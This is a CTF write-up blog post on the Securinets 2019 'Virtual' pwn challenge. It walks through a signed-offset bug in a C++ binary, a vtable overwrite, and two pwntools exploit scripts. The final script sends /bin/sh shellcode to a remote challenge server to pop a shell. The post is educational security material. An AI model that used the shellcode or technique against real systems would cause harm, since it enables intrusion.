---
layout: post
current: post
cover: assets/images/securinets.jpg
navigation: True
title: Securinets 2019 Final - Virtual Pwn challenge
date: 2019-03-24 18:10:00
tags: Writeup CTF Pwn Cpp Exploit
class: post-template
subclass: "post tag-pwn tag-ctf"
author: SakiiR
---

Blackfoot Security went to the Securinets CTF Final event @ Tunis the April 14 2019.

Virtual was a pwn challenge that gaves us **467pts**.

Let's first get some information about the binary and its behaviour:

![Binary Information](/assets/images/virtual/information.png)

Checksec output:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

This is a pretty simple binary, allowing us to set our age and reading some bytes.

Let's open the binary in Ghidra and see what is going on.

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* Customizer::init() */

void __thiscall init(Customizer *this)

{
  short age_cpy;
  char *user_inp;
  Customizer *__s;
  size_t sVar1;
  int age;

  (**(code **)(**(int **)(this + 0x48) + 4))(*(undefined4 *)(this + 0x48));
  puts("But first, how old are you ?");
  age = 0;
  fflush(stdin);
  scanf("%d",&age);
  if (0x1e < age) { // This is verifying if out age is over 0x1e but not if our age is less than 0 :)
    puts("hemm you are too older for this chall :\\");
  }
  age_cpy = (short)age;
  user_inp = (char *)mmap((void *)0x20202020,7,3,0x22,0,0);
  fflush(stdin);
  fgets(user_inp,0x28,stdin);
  fgets(user_inp,0x28,stdin);
  strcpy((char *)(this + (int)age_cpy),user_inp); // Copying user input in this + age
  __s = this + (int)age_cpy;
  sVar1 = strlen((char *)__s);
  __s[sVar1] = (Customizer)0x0;
  trigger(this,(char *)__s);
  return;
}
```

As written as a comment in the source code, it is not possible as an attacker to overwrite too far after the object pointer...

But the code does not check if we write before the pointer.

In Fact, we may write `0x28` bytes before the `this` object.

The goal will be to overwrite the vtable to control EIP when the object destruct itself.

This will be possible by writing `-100` byte before `this`.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Let's go now (:

from pwn import *


def main():
    context.terminal = ["tmux", "splitw", "-h"]

    s = gdb.debug("./virtual", "c\n")

    # Sending age
    s.sendlineafter("?", str(-100))

    # Making payload
    payload = ""
    payload += "A" * 4
    payload += p32(0xDEADBEEF)

    s.sendline(payload)

    s.interactive()


if __name__ == "__main__":
    main()
```

![Crash](/assets/images/virtual/deadbeef.png)

So now, we have a crash. We also know that there is no boring protection useful since the program is allocating us some bytes at the address `0x20202020`.

As show on the screenshot below, our buffer is mapped `rwx` at `0x20202020`.

![VMMap](/assets/images/virtual/vmmap.png)

Using a basic 32bits /bin/sh shellcode will get us a shell.

> We use 0xcc to make sure our shellcode is executed locally

```python

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# @SakiiR

from pwn import *


def main():
    context.terminal = ["tmux", "splitw", "-h"]

    # s = gdb.debug("./virtual", "c\n")
    # s = process("./virtual")
    s = remote("3.86.187.67", 6666)

    shellcode = (
        "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
        "\x73\x68\x68\x2f\x62\x69\x6e\x89"
        "\xe3\xb0\x0b\xcd\x80"
    )
    s.sendlineafter("?", str(-100))

    payload = ""
    payload += "A" * 4
    # +8 to go after the first A and the return address.
    # -0x20 because the addresse is computed like that in the destructor
    payload += p32((0x20202020 + 8) - 0x20)
    payload += "\x90"
    payload += shellcode
    # payload += "\xcc" # useless now :)

    s.sendline(payload)

    s.interactive()


if __name__ == "__main__":
    main()

```
